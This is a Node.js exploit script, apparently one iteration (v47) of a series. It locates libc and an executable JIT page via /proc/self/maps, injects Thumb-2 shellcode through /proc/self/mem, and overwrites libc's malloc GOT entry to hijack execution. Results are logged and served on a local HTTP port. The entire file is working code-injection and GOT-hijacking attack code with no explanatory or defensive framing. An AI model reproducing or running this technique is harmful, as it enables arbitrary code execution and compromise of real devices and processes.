// v47: same 20-byte shellcode but written to END of JIT page (cold I-cache)
// I-cache at jitPage START has stale V8 code; END of JIT page is never-executed → cold → CPU fetches from D-cache
(function() {
  'use strict';
  var fs  = require('fs');
  var http = require('http');
  var PROBE = '/home/owner/share/tmp/sdk_tools/tbprobe47.txt';
  var PORT  = 8134;
  var GOT_OFFSET = 0x143014;

  function w(line) {
    try {
      var cur = ''; try { cur = fs.readFileSync(PROBE, 'utf8'); } catch(e){}
      fs.writeFileSync(PROBE, cur + line + '\n');
    } catch(e) {}
  }
  function hex(n) { return '0x' + (n >>> 0).toString(16); }

  var maps = fs.readFileSync('/proc/self/maps', 'utf8');
  var libcBase = 0, jitPage = 0, jitSz = 0;
  maps.split('\n').forEach(function(line) {
    if (!libcBase && line.indexOf('libc-2.24.so') !== -1)
      libcBase = parseInt(line.split('-')[0], 16);
    var m = line.match(/^([0-9a-f]+)-([0-9a-f]+) rwxp/);
    if (m) { var sz = parseInt(m[2],16)-parseInt(m[1],16); if(sz>jitSz){jitSz=sz;jitPage=parseInt(m[1],16);} }
  });
  var gotAddr = libcBase + GOT_OFFSET;

  // Write shellcode to END of JIT page (cold I-cache region)
  // Offset within page: jitSz - 64 (last 64 bytes, well past any V8 JIT code)
  var SC_OFFSET = jitSz - 64;
  var scAddr = (jitPage + SC_OFFSET) >>> 0;

  var wasByte = -1;
  try { wasByte = fs.readFileSync('/bin/wasutility')[0x7e4b]; } catch(e) {}
  w('[A] libcBase=' + hex(libcBase) + ' jit=' + hex(jitPage) + ' jitSz=' + hex(jitSz) +
    ' scAddr=' + hex(scAddr) + ' got=' + hex(gotAddr) + ' wasByte=0x' + (wasByte&0xff).toString(16));

  if (!libcBase || !jitPage) { w('FAIL:no_addrs'); serve(); return; }

  var memfd = fs.openSync('/proc/self/mem', 'r+');
  var origBuf = new Buffer(4);
  fs.readSync(memfd, origBuf, 0, 4, gotAddr);
  var origMalloc = origBuf.readUInt32LE(0);
  w('[A1] origMalloc=' + hex(origMalloc));

  // 20-byte Thumb-2 shellcode (at scAddr):
  // scAddr+0:  4b 02   ldr r3, [pc, #8]  → origMalloc at scAddr+12
  // scAddr+2:  4a 03   ldr r2, [pc, #12] → gotAddr    at scAddr+16
  // scAddr+4:  13 60   str r3, [r2]       restore GOT
  // scAddr+6:  18 47   bx  r3             tail-call real malloc (r0=size, lr intact)
  // scAddr+8:  00 bf   nop
  // scAddr+10: 00 bf   nop
  // scAddr+12: origMalloc LE
  // scAddr+16: gotAddr LE
  var sc = [
    0x4b, 0x02,
    0x4a, 0x03,
    0x13, 0x60,
    0x18, 0x47,
    0x00, 0xbf,
    0x00, 0xbf,
    (origMalloc >>>  0) & 0xff,
    (origMalloc >>>  8) & 0xff,
    (origMalloc >>> 16) & 0xff,
    (origMalloc >>> 24) & 0xff,
    (gotAddr >>>  0) & 0xff,
    (gotAddr >>>  8) & 0xff,
    (gotAddr >>> 16) & 0xff,
    (gotAddr >>> 24) & 0xff,
  ];
  var SHELLCODE = new Buffer(sc);

  fs.writeSync(memfd, SHELLCODE, 0, SHELLCODE.length, scAddr);
  var rb = new Buffer(4);
  fs.readSync(memfd, rb, 0, 4, scAddr);
  w('[B] sc_at=' + hex(scAddr) + ' rb=' + rb.toString('hex'));

  var thumbTarget = (scAddr + 1) >>> 0;
  var gotBuf = new Buffer(4);
  gotBuf.writeUInt32LE(thumbTarget, 0);
  fs.writeSync(memfd, gotBuf, 0, 4, gotAddr);
  var gotRb = new Buffer(4);
  fs.readSync(memfd, gotRb, 0, 4, gotAddr);
  fs.closeSync(memfd);
  w('[C] thumbTarget=' + hex(thumbTarget) + ' got_rb=' + hex(gotRb.readUInt32LE(0)));

  w('[D] trigger_firing');
  var x = new Buffer(16);
  w('[E] trigger_returned len=' + x.length);

  setTimeout(function() {
    try {
      var fd2 = fs.openSync('/proc/self/mem', 'r');
      var gr = new Buffer(4);
      fs.readSync(fd2, gr, 0, 4, gotAddr);
      fs.closeSync(fd2);
      w('[F] got_2s=' + hex(gr.readUInt32LE(0)) + ' origMalloc=' + hex(origMalloc) +
        ' restored=' + (gr.readUInt32LE(0) === origMalloc ? 'YES' : 'NO'));
    } catch(e) { w('[F] err=' + e.message); }
    serve();
  }, 2000);

  function serve() {
    var body = '';
    try { body = fs.readFileSync(PROBE, 'utf8'); } catch(e){ body='no probe\n'; }
    var srv = http.createServer(function(req,res){ res.end(body); });
    srv.listen(PORT, '127.0.0.1');
    srv.on('error', function(){});
    setInterval(function(){}, 60000);
  }
})();
